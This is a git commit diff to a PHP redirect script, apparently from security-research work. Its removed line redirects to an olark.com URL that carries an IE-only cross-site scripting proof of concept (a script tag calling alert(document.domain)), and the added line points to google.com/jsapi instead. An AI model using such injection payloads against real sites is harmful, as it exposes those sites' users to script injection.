e0cd2921862c7f7601f811d4a399036484107559
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-07 22:02:41 +0100

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,3 +1,3 @@
 <?php
-header('location: https://nrpc.olark.com/nrpc/p?j=olark-xss-ie-only-<?PXML><html:script>alert(document.domain)</html:script>');
+header('location: https://www.google.com/jsapi');
 ?>
